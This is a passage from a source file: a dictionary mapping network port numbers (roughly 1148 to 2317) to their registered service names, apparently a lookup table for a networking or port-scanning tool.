                                   1148: 'elfiq-repl', 1149: 'bvtsonar', 1150: 'blaze', 1151: 'unizensus', 1152: 'winpoplanmess', 1153: 'c1222-acse', 1154: 'resacommunity', 1155: 'nfa',
                                   1156: 'iascontrol-oms',
                                   1157: 'iascontrol',
                                   1158: 'lsnr', 1159: 'oracle-oms', 1160: 'olsv', 1161: 'health-polling', 1162: 'health-trap', 1163: 'sddp', 1164: 'qsm-proxy', 1165: 'qsm-gui', 1166: 'qsm-remote',
                                   1167: 'cisco-ipsla',
                                   1168: 'vchat',
                                   1169: 'tripwire', 1170: 'atc-lm', 1171: 'atc-appserver', 1172: 'dnap', 1173: 'd-cinema-rrp', 1174: 'fnet-remote-ui', 1175: 'dossier', 1176: 'indigo-server',
                                   1177: 'dkmessenger',
                                   1178: 'skkserv',
                                   1179: 'b2n', 1180: 'mc-client', 1181: '3comnetman', 1182: 'accelenet', 1183: 'llsurfup-http', 1184: 'llsurfup-https', 1185: 'catchpole', 1186: 'mysql-cluster',
                                   1187: 'alias',
                                   1188: 'hp-webadmin',
                                   1189: 'unet', 1190: 'commlinx-avl', 1191: 'gpfs', 1192: 'caids-sensor', 1193: 'fiveacross', 1194: 'openvpn', 1195: 'rsf-1', 1196: 'netmagic', 1197: 'carrius-rshell',
                                   1198: 'cajo-discovery',
                                   1199: 'dmidi', 1200: 'scol', 1201: 'nucleus-sand', 1202: 'caiccipc', 1203: 'ssslic-mgr', 1204: 'ssslog-mgr', 1205: 'accord-mgc', 1206: 'anthony-data',
                                   1207: 'metasage',
                                   1208: 'seagull-ais',
                                   1209: 'ipcd3', 1210: 'eoss', 1211: 'groove-dpp', 1212: 'lupa', 1213: 'mpc-lifenet', 1214: 'fasttrack', 1215: 'scanstat-1', 1216: 'etebac5', 1217: 'hpss-ndapi',
                                   1218: 'aeroflight-ads',
                                   1219: 'aeroflight-ret', 1220: 'quicktime', 1221: 'sweetware-apps', 1222: 'nerv', 1223: 'tgp', 1224: 'vpnz', 1225: 'slinkysearch', 1226: 'stgxfws', 1227: 'dns2go',
                                   1228: 'florence',
                                   1229: 'zented',
                                   1230: 'periscope', 1231: 'menandmice-lpm', 1232: 'first-defense', 1233: 'univ-appserver', 1235: 'mosaicsyssvc1', 1236: 'bvcontrol', 1237: 'tsdos390',
                                   1238: 'hacl-qs', 1239: 'nmsd',
                                   1240: 'instantia',
                                   1242: 'nmasoverip', 1243: 'serialgateway', 1244: 'isbconference1', 1245: 'isbconference2', 1246: 'payrouter', 1247: 'visionpyramid', 1248: 'hermes',
                                   1249: 'mesavistaco',
                                   1250: 'swldy-sias',
                                   1251: 'servergraph', 1252: 'bspne-pcc', 1253: 'q55-pcc', 1254: 'de-noc', 1255: 'de-cache-query', 1256: 'de-server', 1257: 'shockwave2', 1258: 'opennl',
                                   1259: 'opennl-voice',
                                   1260: 'ibm-ssd',
                                   1261: 'mpshrsv', 1262: 'qnts-orb', 1263: 'dka', 1264: 'prat', 1265: 'dssiapi', 1266: 'dellpwrappks', 1267: 'epc', 1268: 'propel-msgsys', 1269: 'watilapp',
                                   1270: 'ssserver', 1271: 'excw',
                                   1272: 'cspmlockmgr', 1273: 'emc-gateway', 1274: 't1distproc', 1275: 'ivcollector', 1276: 'ivmanager', 1277: 'miva-mqs', 1278: 'dellwebadmin-1',
                                   1279: 'dellwebadmin-2',
                                   1280: 'pictrography',
                                   1281: 'healthd', 1282: 'emperion', 1283: 'productinfo', 1284: 'iee-qfx', 1285: 'neoiface', 1286: 'netuitive', 1287: 'routematch', 1288: 'navbuddy',
                                   1289: 'jwalkserver',
                                   1290: 'winjaserver',
                                   1291: 'seagulllms', 1292: 'dsdn', 1293: 'pkt-krb-ipsec', 1294: 'cmmdriver', 1295: 'ehtp', 1296: 'dproxy', 1297: 'sdproxy', 1298: 'lpcp', 1299: 'hp-sci',
                                   1300: 'h323hostcallsc',
                                   1301: 'ci3-software-1', 1302: 'ci3-software-2', 1303: 'sftsrv', 1304: 'boomerang', 1305: 'pe-mike', 1306: 're-conn-proto', 1307: 'pacmand', 1308: 'odsi',
                                   1309: 'jtag-server',
                                   1310: 'husky',
                                   1311: 'rxmon', 1312: 'sti-envision', 1313: 'bmc_patroldb', 1314: 'pdps', 1315: 'els', 1316: 'exbit-escp', 1317: 'vrts-ipcserver', 1318: 'krb5gatekeeper',
                                   1319: 'amx-icsp',
                                   1320: 'amx-axbnet',
                                   1321: 'pip', 1322: 'novation', 1323: 'brcd', 1324: 'delta-mcp', 1325: 'dx-instrument', 1326: 'wimsic', 1327: 'ultrex', 1328: 'ewall', 1329: 'netdb-export',
                                   1330: 'streetperfect',
                                   1331: 'intersan',
                                   1332: 'pcia-rxp-b', 1333: 'passwrd-policy', 1334: 'writesrv', 1335: 'digital-notary', 1336: 'ischat', 1337: 'waste', 1338: 'wmc-log-svc', 1339: 'kjtsiteserver',
                                   1340: 'naap',
                                   1341: 'qubes',
                                   1342: 'esbroker', 1343: 're101', 1344: 'icap', 1345: 'vpjp', 1346: 'alta-ana-lm', 1347: 'bbn-mmc', 1348: 'bbn-mmx', 1349: 'sbook', 1350: 'editbench',
                                   1351: 'equationbuilder',
                                   1352: 'lotusnotes',
                                   1353: 'relief', 1354: 'rightbrain', 1355: 'intuitive-edge', 1356: 'cuillamartin', 1357: 'pegboard', 1358: 'connlcli', 1359: 'ftsrv', 1360: 'mimer', 1361: 'linx',
                                   1362: 'timeflies',
                                   1363: 'ndm-requester', 1364: 'ndm-server', 1365: 'adapt-sna', 1366: 'netware-csp', 1367: 'dcs', 1368: 'screencast', 1369: 'gv-us', 1370: 'us-gv', 1371: 'fc-cli',
                                   1372: 'fc-ser',
                                   1373: 'chromagrafx',
                                   1374: 'molly', 1375: 'bytex', 1376: 'ibm-pps', 1377: 'cichlid', 1378: 'elan', 1379: 'dbreporter', 1380: 'telesis-licman', 1381: 'apple-licman', 1383: 'gwha',
                                   1384: 'os-licman',
                                   1385: 'atex_elmd',
                                   1386: 'checksum', 1387: 'cadsi-lm', 1388: 'objective-dbc', 1389: 'iclpv-dm', 1390: 'iclpv-sc', 1391: 'iclpv-sas', 1392: 'iclpv-pm', 1393: 'iclpv-nls',
                                   1394: 'iclpv-nlc', 1395: 'iclpv-wsm',
                                   1396: 'dvl-activemail', 1397: 'audio-activmail', 1398: 'video-activmail', 1399: 'cadkey-licman', 1400: 'cadkey-tablet', 1401: 'goldleaf-licman', 1402: 'prm-sm-np',
                                   1403: 'prm-nm-np',
                                   1404: 'igi-lm',
                                   1405: 'ibm-res', 1406: 'netlabs-lm', 1407: 'dbsa-lm', 1408: 'sophia-lm', 1409: 'here-lm', 1410: 'hiq', 1411: 'af', 1412: 'innosys', 1413: 'innosys-acl',
                                   1414: 'ibm-mqseries',
                                   1415: 'dbstar',
                                   1416: 'novell-lu6.2', 1417: 'timbuktu-srv1', 1418: 'timbuktu-srv2', 1419: 'timbuktu-srv3', 1420: 'timbuktu-srv4', 1421: 'gandalf-lm', 1422: 'autodesk-lm',
                                   1423: 'essbase', 1424: 'hybrid',
                                   1425: 'zion-lm', 1426: 'sas-1', 1427: 'mloadd', 1428: 'informatik-lm', 1429: 'nms', 1430: 'tpdu', 1431: 'rgtp', 1432: 'blueberry-lm', 1433: 'ms-sql-s',
                                   1434: 'ms-sql-m', 1435: 'ibm-cics',
                                   1436: 'sas-2', 1437: 'tabula', 1438: 'eicon-server', 1439: 'eicon-x25', 1440: 'eicon-slp', 1441: 'cadis-1', 1442: 'cadis-2', 1443: 'ies-lm', 1444: 'marcam-lm',
                                   1445: 'proxima-lm',
                                   1446: 'ora-lm',
                                   1447: 'apri-lm', 1448: 'oc-lm', 1449: 'peport', 1450: 'dwf', 1451: 'infoman', 1452: 'gtegsc-lm', 1453: 'genie-lm', 1454: 'interhdl_elmd', 1455: 'esl-lm',
                                   1456: 'dca', 1457: 'valisys-lm',
                                   1458: 'nrcabq-lm', 1459: 'proshare1', 1460: 'proshare2', 1461: 'ibm_wrless_lan', 1462: 'world-lm', 1463: 'nucleus', 1464: 'msl_lmd', 1465: 'pipes',
                                   1466: 'oceansoft-lm', 1469: 'aal-lm',
                                   1470: 'uaiact', 1471: 'csdmbase', 1472: 'csdm', 1473: 'openmath', 1474: 'telefinder', 1475: 'taligent-lm', 1476: 'clvm-cfg', 1477: 'ms-sna-server',
                                   1478: 'ms-sna-base',
                                   1479: 'dberegister',
                                   1480: 'pacerforum', 1481: 'airs', 1482: 'miteksys-lm', 1483: 'afs', 1484: 'confluent', 1485: 'lansource', 1486: 'nms_topo_serv', 1487: 'localinfosrvr',
                                   1488: 'docstor',
                                   1489: 'dmdocbroker',
                                   1490: 'insitu-conf', 1491: 'anynetgateway', 1492: 'stone-design-1', 1493: 'netmap_lm', 1494: 'citrix-ica', 1495: 'cvc', 1496: 'liberty-lm', 1497: 'rfx-lm',
                                   1498: 'watcom-sql', 1499: 'fhc',
                                   1500: 'vlsi-lm', 1501: 'sas-3', 1502: 'shivadiscovery', 1503: 'imtc-mcs', 1504: 'evb-elm', 1505: 'funkproxy', 1506: 'utcd', 1507: 'symplex', 1508: 'diagmond',
                                   1509: 'robcad-lm',
                                   1510: 'mvx-lm',
                                   1511: '3l-l1', 1512: 'wins', 1513: 'fujitsu-dtc', 1514: 'fujitsu-dtcns', 1515: 'ifor-protocol', 1516: 'vpad', 1517: 'vpac', 1518: 'vpvd', 1519: 'vpvc',
                                   1520: 'atm-zip-office',
                                   1521: 'oracle',
                                   1522: 'rna-lm', 1523: 'cichild-lm', 1524: 'ingreslock', 1525: 'orasrv', 1526: 'pdap-np', 1527: 'tlisrv', 1528: 'mciautoreg', 1529: 'support', 1530: 'rap-service',
                                   1531: 'rap-listen',
                                   1532: 'miroconnect', 1533: 'virtual-places', 1534: 'micromuse-lm', 1535: 'ampr-info', 1536: 'ampr-inter', 1537: 'sdsc-lm', 1538: '3ds-lm', 1539: 'intellistor-lm',
                                   1540: 'rds',
                                   1541: 'rds2',
                                   1542: 'gridgen-elmd', 1543: 'simba-cs', 1544: 'aspeclmd', 1545: 'vistium-share', 1546: 'abbaccuray', 1547: 'laplink', 1548: 'axon-lm', 1549: 'shivahose',
                                   1550: '3m-image-lm',
                                   1551: 'hecmtl-db',
                                   1552: 'pciarray', 1553: 'sna-cs', 1554: 'caci-lm', 1555: 'livelan', 1556: 'veritas_pbx', 1557: 'arbortext-lm', 1558: 'xingmpeg', 1559: 'web2host', 1560: 'asci-val',
                                   1561: 'facilityview',
                                   1562: 'pconnectmgr', 1563: 'cadabra-lm', 1564: 'pay-per-view', 1565: 'winddlb', 1566: 'corelvideo', 1567: 'jlicelmd', 1568: 'tsspmap', 1569: 'ets', 1570: 'orbixd',
                                   1571: 'rdb-dbs-disp',
                                   1572: 'chip-lm', 1573: 'itscomm-ns', 1574: 'mvel-lm', 1575: 'oraclenames', 1576: 'moldflow-lm', 1577: 'hypercube-lm', 1578: 'jacobus-lm', 1579: 'ioc-sea-lm',
                                   1580: 'tn-tl-r1',
                                   1581: 'mil-2045-47001',
                                   1582: 'msims', 1583: 'simbaexpress', 1584: 'tn-tl-fd2', 1585: 'intv', 1586: 'ibm-abtact', 1587: 'pra_elmd', 1588: 'triquest-lm', 1589: 'vqp', 1590: 'gemini-lm',
                                   1591: 'ncpm-pm',
                                   1592: 'commonspace',
                                   1593: 'mainsoft-lm', 1594: 'sixtrak', 1595: 'radio', 1596: 'radio-sm', 1597: 'orbplus-iiop', 1598: 'picknfs', 1599: 'simbaservices', 1600: 'issd', 1601: 'aas',
                                   1602: 'inspect',
                                   1603: 'picodbc',
                                   1604: 'icabrowser', 1605: 'slp', 1606: 'slm-api', 1607: 'stt', 1608: 'smart-lm', 1609: 'isysg-lm', 1610: 'taurus-wh', 1611: 'ill', 1612: 'netbill-trans',
                                   1613: 'netbill-keyrep',
                                   1614: 'netbill-cred',
                                   1615: 'netbill-auth', 1616: 'netbill-prod', 1617: 'nimrod-agent', 1618: 'skytelnet', 1619: 'xs-openstorage', 1620: 'faxportwinport', 1621: 'softdataphone',
                                   1622: 'ontime',
                                   1623: 'jaleosnd',
                                   1624: 'udp-sr-port', 1625: 'svs-omagent', 1626: 'shockwave', 1627: 't128-gateway', 1628: 'lontalk-norm', 1629: 'lontalk-urgnt', 1630: 'oraclenet8cman',
                                   1631: 'visitview', 1632: 'pammratc',
                                   1633: 'pammrpc', 1634: 'loaprobe', 1635: 'edb-server1', 1636: 'isdc', 1637: 'islc', 1638: 'ismc', 1639: 'cert-initiator', 1640: 'cert-responder', 1641: 'invision',
                                   1642: 'isis-am',
                                   1643: 'isis-ambc',
                                   1644: 'saiseh', 1645: 'sightline', 1646: 'sa-msg-port', 1647: 'rsap', 1648: 'concurrent-lm', 1649: 'kermit', 1650: 'nkd', 1651: 'shiva_confsrvr', 1652: 'xnmp',
                                   1653: 'alphatech-lm',
                                   1654: 'stargatealerts', 1655: 'dec-mbadmin', 1656: 'dec-mbadmin-h', 1657: 'fujitsu-mmpdc', 1658: 'sixnetudr', 1659: 'sg-lm', 1660: 'skip-mc-gikreq',
                                   1661: 'netview-aix-1',
                                   1662: 'netview-aix-2',
                                   1663: 'netview-aix-3', 1664: 'netview-aix-4', 1665: 'netview-aix-5', 1666: 'netview-aix-6', 1667: 'netview-aix-7', 1668: 'netview-aix-8', 1669: 'netview-aix-9',
                                   1670: 'netview-aix-10',
                                   1671: 'netview-aix-11', 1672: 'netview-aix-12', 1673: 'proshare-mc-1', 1674: 'proshare-mc-2', 1675: 'pdp', 1676: 'netcomm1', 1677: 'groupwise', 1678: 'prolink',
                                   1679: 'darcorp-lm',
                                   1680: 'CarbonCopy', 1681: 'sd-elmd', 1682: 'lanyon-lantern', 1683: 'ncpm-hip', 1684: 'snaresecure', 1685: 'n2nremote', 1686: 'cvmon', 1687: 'nsjtp-ctrl',
                                   1688: 'nsjtp-data',
                                   1689: 'firefox',
                                   1690: 'ng-umds', 1691: 'empire-empuma', 1692: 'sstsys-lm', 1693: 'rrirtr', 1694: 'rrimwm', 1695: 'rrilwm', 1696: 'rrifmm', 1697: 'rrisat', 1698: 'rsvp-encap-1',
                                   1699: 'rsvp-encap-2',
                                   1700: 'mps-raft', 1701: 'l2f', 1702: 'deskshare', 1703: 'hb-engine', 1704: 'bcs-broker', 1705: 'slingshot', 1706: 'jetform', 1707: 'vdmplay', 1708: 'gat-lmd',
                                   1709: 'centra',
                                   1710: 'impera',
                                   1711: 'pptconference', 1712: 'registrar', 1713: 'conferencetalk', 1714: 'sesi-lm', 1715: 'houdini-lm', 1716: 'xmsg', 1717: 'fj-hdnet', 1718: 'h323gatedisc',
                                   1719: 'h323gatestat',
                                   1720: 'h323q931',
                                   1721: 'caicci', 1722: 'hks-lm', 1723: 'pptp', 1724: 'csbphonemaster', 1725: 'iden-ralp', 1726: 'iberiagames', 1727: 'winddx', 1728: 'telindus', 1729: 'citynl',
                                   1730: 'roketz',
                                   1731: 'msiccp',
                                   1732: 'proxim', 1733: 'siipat', 1734: 'cambertx-lm', 1735: 'privatechat', 1736: 'street-stream', 1737: 'ultimad', 1738: 'gamegen1', 1739: 'webaccess',
                                   1740: 'encore',
                                   1741: 'cisco-net-mgmt',
                                   1742: '3Com-nsd', 1743: 'cinegrfx-lm', 1744: 'ncpm-ft', 1745: 'remote-winsock', 1746: 'ftrapid-1', 1747: 'ftrapid-2', 1748: 'oracle-em1', 1749: 'aspen-services',
                                   1750: 'sslp',
                                   1751: 'swiftnet',
                                   1752: 'lofr-lm', 1753: 'predatar-comms', 1754: 'oracle-em2', 1755: 'wms', 1756: 'capfast-lmd', 1757: 'cnhrp', 1758: 'tftp-mcast', 1759: 'spss-lm',
                                   1760: 'www-ldap-gw', 1764: 'landesk-rc',
                                   1765: 'cft-4', 1766: 'cft-5', 1767: 'cft-6', 1768: 'cft-7', 1769: 'bmc-net-adm', 1770: 'bmc-net-svc', 1771: 'vaultbase', 1772: 'essweb-gw', 1773: 'kmscontrol',
                                   1774: 'global-dtserv',
                                   1775: 'vdab',
                                   1776: 'femis', 1777: 'powerguardian', 1778: 'prodigy-intrnet', 1779: 'pharmasoft', 1780: 'dpkeyserv', 1781: 'answersoft-lm', 1782: 'hp-hcip', 1784: 'finle-lm',
                                   1785: 'windlm',
                                   1786: 'funk-logger',
                                   1787: 'funk-license', 1788: 'psmond', 1789: 'hello', 1790: 'nmsp', 1791: 'ea1', 1792: 'ibm-dt-2', 1793: 'rsc-robot', 1794: 'cera-bcm', 1795: 'dpi-proxy',
                                   1796: 'vocaltec-admin',
                                   1797: 'uma',
                                   1798: 'etp', 1799: 'netrisk', 1800: 'ansys-lm', 1801: 'msmq', 1802: 'concomp1', 1803: 'hp-hcip-gwy', 1804: 'enl', 1805: 'enl-name', 1806: 'musiconline',
                                   1807: 'fhsp', 1808: 'oracle-vp2',
                                   1809: 'oracle-vp1', 1810: 'jerand-lm', 1811: 'scientia-sdb', 1812: 'radius', 1813: 'radius-acct', 1814: 'tdp-suite', 1815: 'mmpft', 1816: 'harp', 1817: 'rkb-oscs',
                                   1818: 'etftp',
                                   1819: 'plato-lm',
                                   1820: 'mcagent', 1821: 'donnyworld', 1822: 'es-elmd', 1823: 'unisys-lm', 1824: 'metrics-pas', 1825: 'direcpc-video', 1826: 'ardt', 1827: 'pcm', 1828: 'itm-mcell-u',
                                   1829: 'optika-emedia',
                                   1830: 'net8-cman', 1831: 'myrtle', 1832: 'tht-treasure', 1833: 'udpradio', 1834: 'ardusuni', 1835: 'ardusmul', 1836: 'ste-smsc', 1837: 'csoft1', 1838: 'talnet',
                                   1839: 'netopia-vo1',
                                   1840: 'netopia-vo2', 1841: 'netopia-vo3', 1842: 'netopia-vo4', 1843: 'netopia-vo5', 1844: 'direcpc-dll', 1845: 'altalink', 1846: 'tunstall-pnc', 1847: 'slp-notify',
                                   1848: 'fjdocdist',
                                   1849: 'alpha-sms', 1850: 'gsi', 1851: 'ctcd', 1852: 'virtual-time', 1853: 'vids-avtp', 1854: 'buddy-draw', 1855: 'fiorano-rtrsvc', 1856: 'fiorano-msgsvc',
                                   1857: 'datacaptor',
                                   1858: 'privateark',
                                   1859: 'gammafetchsvr', 1860: 'sunscalar-svc', 1861: 'lecroy-vicp', 1862: 'mysql-cm-agent', 1863: 'msnp', 1864: 'paradym-31', 1865: 'entp', 1866: 'swrmi',
                                   1867: 'udrive',
                                   1868: 'viziblebrowser',
                                   1869: 'transact', 1870: 'sunscalar-dns', 1871: 'canocentral0', 1872: 'canocentral1', 1873: 'fjmpjps', 1874: 'fjswapsnp', 1875: 'westell-stats', 1876: 'ewcappsrv',
                                   1877: 'hp-webqosdb',
                                   1878: 'drmsmc',
                                   1879: 'nettgain-nms', 1880: 'vsat-control', 1881: 'ibm-mqseries2', 1882: 'ecsqdmn', 1883: 'mqtt', 1884: 'idmaps', 1885: 'vrtstrapserver', 1886: 'leoip',
                                   1887: 'filex-lport',
                                   1888: 'ncconfig',
                                   1889: 'unify-adapter', 1890: 'wilkenlistener', 1891: 'childkey-notif', 1892: 'childkey-ctrl', 1893: 'elad', 1894: 'o2server-port', 1896: 'b-novative-ls',
                                   1897: 'metaagent',
                                   1898: 'cymtec-port',
                                   1899: 'mc2studios', 1901: 'fjicl-tep-a', 1902: 'fjicl-tep-b', 1903: 'linkname', 1904: 'fjicl-tep-c', 1905: 'sugp', 1906: 'tpmd', 1907: 'intrastar', 1908: 'dawn',
                                   1909: 'global-wlink',
                                   1910: 'ultrabac', 1911: 'mtp', 1912: 'rhp-iibp', 1913: 'armadp', 1914: 'elm-momentum', 1915: 'facelink', 1916: 'persona', 1917: 'noagent', 1918: 'can-nds',
                                   1919: 'can-dch',
                                   1920: 'can-ferret',
                                   1921: 'noadmin', 1922: 'tapestry', 1923: 'spice', 1924: 'xiip', 1925: 'discovery-port', 1926: 'egs', 1927: 'videte-cipc', 1928: 'emsd-port', 1929: 'bandwiz-system',
                                   1930: 'driveappserver',
                                   1931: 'amdsched', 1932: 'ctt-broker', 1933: 'xmapi', 1934: 'xaapi', 1935: 'rtmp', 1936: 'jetcmeserver', 1937: 'jwserver', 1938: 'jwclient', 1939: 'jvserver',
                                   1940: 'jvclient',
                                   1941: 'dic-aida',
                                   1942: 'res', 1943: 'beeyond-media', 1944: 'close-combat', 1945: 'dialogic-elmd', 1946: 'tekpls', 1947: 'sentinelsrm', 1948: 'eye2eye', 1949: 'ismaeasdaqlive',
                                   1950: 'ismaeasdaqtest',
                                   1951: 'bcs-lmserver', 1952: 'mpnjsc', 1953: 'rapidbase', 1954: 'abr-api', 1955: 'abr-secure', 1956: 'vrtl-vmf-ds', 1957: 'unix-status', 1958: 'dxadmind',
                                   1959: 'simp-all',
                                   1960: 'nasmanager',
                                   1961: 'bts-appserver', 1962: 'biap-mp', 1963: 'webmachine', 1964: 'solid-e-engine', 1965: 'tivoli-npm', 1966: 'slush', 1967: 'sns-quote', 1968: 'lipsinc',
                                   1969: 'lipsinc1',
                                   1971: 'netop-school',
                                   1972: 'intersys-cache', 1973: 'dlsrap', 1974: 'drp', 1975: 'tcoflashagent', 1976: 'tcoregagent', 1977: 'tcoaddressbook', 1978: 'unisql', 1979: 'unisql-java',
                                   1980: 'pearldoc-xact',
                                   1981: 'p2pq',
                                   1982: 'estamp', 1983: 'lhtp', 1984: 'bigbrother', 1985: 'hsrp', 1986: 'licensedaemon', 1987: 'tr-rsrb-p1', 1988: 'tr-rsrb-p2', 1989: 'tr-rsrb-p3', 1990: 'stun-p1',
                                   1991: 'stun-p2',
                                   1992: 'stun-p3',
                                   1993: 'snmp-tcp-port', 1994: 'stun-port', 1995: 'perf-port', 1996: 'tr-rsrb-port', 1997: 'gdp-port', 1998: 'x25-svc-port', 1999: 'tcp-id-port', 2000: 'cisco-sccp',
                                   2001: 'dc',
                                   2002: 'globe',
                                   2003: 'finger', 2004: 'mailbox', 2006: 'invokator', 2007: 'dectalk', 2008: 'conf', 2009: 'news', 2010: 'search', 2011: 'raid-cc', 2012: 'ttyinfo', 2013: 'raid-am',
                                   2014: 'troff',
                                   2015: 'cypress',
                                   2016: 'bootserver', 2017: 'cypress-stat', 2018: 'terminaldb', 2019: 'whosockami', 2020: 'xinupageserver', 2021: 'servexec', 2022: 'down', 2023: 'xinuexpansion3',
                                   2024: 'xinuexpansion4',
                                   2025: 'ellpack', 2026: 'scrabble', 2027: 'shadowserver', 2028: 'submitserver', 2029: 'hsrpv6', 2030: 'device2', 2031: 'mobrien-chat', 2032: 'blackboard',
                                   2033: 'glogger', 2034: 'scoremgr',
                                   2035: 'imsldoc', 2036: 'e-dpnet', 2037: 'applus', 2038: 'objectmanager', 2039: 'prizma', 2040: 'lam', 2041: 'interbase', 2042: 'isis', 2043: 'isis-bcast',
                                   2044: 'rimsl', 2045: 'cdfunc',
                                   2046: 'sdfunc', 2047: 'dls', 2048: 'dls-monitor', 2049: 'nfs', 2050: 'av-emb-config', 2051: 'epnsdp', 2052: 'clearvisn', 2053: 'knetd', 2054: 'weblogin',
                                   2055: 'iop', 2056: 'omnisky',
                                   2057: 'rich-cp', 2058: 'newwavesearch', 2059: 'bmc-messaging', 2060: 'teleniumdaemon', 2061: 'netmount', 2062: 'icg-swp', 2063: 'icg-bridge', 2064: 'dnet-keyproxy',
                                   2065: 'dlsrpn',
                                   2066: 'aura',
                                   2067: 'dlswpn', 2068: 'avocentkvm', 2069: 'event-port', 2070: 'ah-esp-encap', 2071: 'acp-port', 2072: 'msync', 2073: 'gxs-data-port', 2074: 'vrtl-vmf-sa',
                                   2075: 'newlixengine',
                                   2076: 'newlixconfig',
                                   2077: 'tsrmagt', 2078: 'tpcsrvr', 2079: 'idware-router', 2080: 'autodesk-nlm', 2081: 'kme-trap-port', 2082: 'infowave', 2083: 'radsec', 2084: 'sunclustergeo',
                                   2085: 'ada-cip',
                                   2086: 'gnunet',
                                   2087: 'eli', 2088: 'ip-blf', 2089: 'sep', 2090: 'lrp', 2091: 'prp', 2092: 'descent3', 2093: 'nbx-cc', 2094: 'nbx-au', 2095: 'nbx-ser', 2096: 'nbx-dir',
                                   2097: 'jetformpreview',
                                   2098: 'dialog-port',
                                   2099: 'h2250-annex-g', 2100: 'amiganetfs', 2101: 'rtcm-sc104', 2102: 'zephyr-srv', 2103: 'zephyr-clt', 2104: 'zephyr-hm', 2105: 'eklogin', 2106: 'ekshell',
                                   2107: 'msmq-mgmt',
                                   2108: 'rkinit',
                                   2109: 'ergolight', 2110: 'umsp', 2111: 'kx', 2112: 'kip', 2113: 'hsl-storm', 2114: 'newheights', 2115: 'kdm', 2116: 'ccowcmr', 2117: 'mentaclient',
                                   2118: 'mentaserver',
                                   2119: 'gsigatekeeper',
                                   2120: 'kauth', 2121: 'ccproxy-ftp', 2122: 'caupc-remote', 2123: 'gtp-control', 2124: 'elatelink', 2125: 'lockstep', 2126: 'pktcable-cops', 2127: 'index-pc-wb',
                                   2128: 'net-steward',
                                   2129: 'cs-live',
                                   2130: 'xds', 2131: 'avantageb2b', 2132: 'solera-epmap', 2133: 'zymed-zpp', 2134: 'avenue', 2135: 'gris', 2136: 'appworxsrv', 2137: 'connect', 2138: 'unbind-cluster',
                                   2139: 'ias-auth',
                                   2140: 'ias-reg', 2141: 'ias-admind', 2142: 'tdmoip', 2143: 'lv-jc', 2144: 'lv-ffx', 2145: 'lv-pici', 2146: 'lv-not', 2147: 'lv-auth', 2148: 'veritas-ucl',
                                   2149: 'acptsys',
                                   2150: 'dynamic3d',
                                   2151: 'docent', 2152: 'gtp-user', 2153: 'ctlptc', 2154: 'stdptc', 2155: 'brdptc', 2156: 'trp', 2157: 'xnds', 2158: 'touchnetplus', 2159: 'gdbremote',
                                   2160: 'apc-2160', 2161: 'apc-agent',
                                   2162: 'navisphere', 2163: 'navisphere-sec', 2164: 'ddns-v3', 2165: 'x-bone-api', 2166: 'iwserver', 2167: 'raw-serial', 2168: 'easy-soft-mux', 2169: 'brain',
                                   2170: 'eyetv',
                                   2171: 'msfw-storage',
                                   2172: 'msfw-s-storage', 2173: 'msfw-replica', 2174: 'msfw-array', 2175: 'airsync', 2176: 'rapi', 2177: 'qwave', 2178: 'bitspeer', 2179: 'vmrdp', 2180: 'mc-gt-srv',
                                   2181: 'eforward',
                                   2182: 'cgn-stat',
                                   2183: 'cgn-config', 2185: 'onbase-dds', 2186: 'gtaua', 2187: 'ssmc', 2188: 'radware-rpm', 2189: 'radware-rpm-s', 2190: 'tivoconnect', 2191: 'tvbus', 2192: 'asdis',
                                   2193: 'drwcs',
                                   2197: 'mnp-exchange', 2198: 'onehome-remote', 2199: 'onehome-help', 2200: 'ici', 2201: 'ats', 2202: 'imtc-map', 2203: 'b2-runtime', 2204: 'b2-license', 2205: 'jps',
                                   2206: 'hpocbus',
                                   2207: 'hpssd',
                                   2208: 'hpiod', 2209: 'rimf-ps', 2210: 'noaaport', 2211: 'emwin', 2212: 'leecoposserver', 2213: 'kali', 2214: 'rpi', 2215: 'ipcore', 2216: 'vtu-comms',
                                   2217: 'gotodevice', 2218: 'bounzza',
                                   2219: 'netiq-ncap', 2220: 'netiq', 2221: 'rockwell-csp1', 2222: 'EtherNetIP-1', 2223: 'rockwell-csp2', 2224: 'efi-mg', 2225: 'rcip-itu', 2226: 'di-drm',
                                   2227: 'di-msg', 2228: 'ehome-ms',
                                   2229: 'datalens', 2230: 'queueadm', 2231: 'wimaxasncp', 2232: 'ivs-video', 2233: 'infocrypt', 2234: 'directplay', 2235: 'sercomm-wlink', 2236: 'nani',
                                   2237: 'optech-port1-lm',
                                   2238: 'aviva-sna',
                                   2239: 'imagequery', 2240: 'recipe', 2241: 'ivsd', 2242: 'foliocorp', 2243: 'magicom', 2244: 'nmsserver', 2245: 'hao', 2246: 'pc-mta-addrmap', 2247: 'antidotemgrsvr',
                                   2248: 'ums',
                                   2249: 'rfmp',
                                   2250: 'remote-collab', 2251: 'dif-port', 2252: 'njenet-ssl', 2253: 'dtv-chan-req', 2254: 'seispoc', 2255: 'vrtp', 2256: 'pcc-mfp', 2257: 'simple-tx-rx',
                                   2258: 'rcts', 2260: 'apc-2260',
                                   2261: 'comotionmaster', 2262: 'comotionback', 2263: 'ecwcfg', 2264: 'apx500api-1', 2265: 'apx500api-2', 2266: 'mfserver', 2267: 'ontobroker', 2268: 'amt',
                                   2269: 'mikey',
                                   2270: 'starschool',
                                   2271: 'mmcals', 2272: 'mmcal', 2273: 'mysql-im', 2274: 'pcttunnell', 2275: 'ibridge-data', 2276: 'ibridge-mgmt', 2277: 'bluectrlproxy', 2278: 's3db',
                                   2279: 'xmquery', 2280: 'lnvpoller',
                                   2281: 'lnvconsole', 2282: 'lnvalarm', 2283: 'lnvstatus', 2284: 'lnvmaps', 2285: 'lnvmailmon', 2286: 'nas-metering', 2287: 'dna', 2288: 'netml', 2289: 'dict-lookup',
                                   2290: 'sonus-logging',
                                   2291: 'eapsp', 2292: 'mib-streaming', 2293: 'npdbgmngr', 2294: 'konshus-lm', 2295: 'advant-lm', 2296: 'theta-lm', 2297: 'd2k-datamover1', 2298: 'd2k-datamover2',
                                   2299: 'pc-telecommute',
                                   2300: 'cvmmon', 2301: 'compaqdiag', 2302: 'binderysupport', 2303: 'proxy-gateway', 2304: 'attachmate-uts', 2305: 'mt-scaleserver', 2306: 'tappi-boxnet',
                                   2307: 'pehelp', 2308: 'sdhelp',
                                   2309: 'sdserver', 2310: 'sdclient', 2311: 'messageservice', 2312: 'wanscaler', 2313: 'iapp', 2314: 'cr-websystems', 2315: 'precise-sft', 2316: 'sent-lm',
                                   2317: 'attachmate-g32',
